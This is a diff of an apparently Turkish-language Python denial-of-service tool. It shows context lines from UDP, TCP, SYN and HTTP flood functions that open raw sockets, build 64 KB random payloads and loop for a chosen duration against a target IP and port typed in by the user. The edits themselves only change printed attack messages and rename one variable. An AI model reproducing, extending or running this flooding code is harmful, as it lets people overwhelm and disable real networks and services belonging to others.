@@ -7,7 +7,7 @@ import requests
 
 
 def udp_flood(hedef_ip, hedef_port, sure):
-    print("\nUDP Flood saldırısı başlatılıyor")
+    print("\nUDP Flood attck başlıyor")
     bitis_zamani = time.time() + sure
     soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     veri_paketi = random._urandom(1024 * 64)  
@@ -20,7 +20,7 @@ def udp_flood(hedef_ip, hedef_port, sure):
 
 
 def tcp_flood(hedef_ip, hedef_port, sure):
-    print("\nTCP Flood saldırısı başlatılıyor")
+    print("\nTCP Flood attck başlıyor")
     bitis_zamani = time.time() + sure
     soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -35,7 +35,7 @@ def tcp_flood(hedef_ip, hedef_port, sure):
 
 
 def syn_flood(hedef_ip, hedef_port, sure):
-    print("\nSYN saldırısı başlatılıyor")
+    print("\nSYN attck başlatılıyor")
     bitis_zamani = time.time() + sure
     soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -69,8 +69,8 @@ def http_flood(hedef_url, sure):
 
 
 def main():
-    baba = "cluster" 
-    print(f"{baba} denemesidir \n")
+    küme = "cluster" 
+    print(f"{küme} denemesidir \n")
 
     hedef_ip = input("Hedef IP Adresi: ")
     hedef_port = int(input("Hedef Port Numarası: "))
@@ -112,3 +112,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
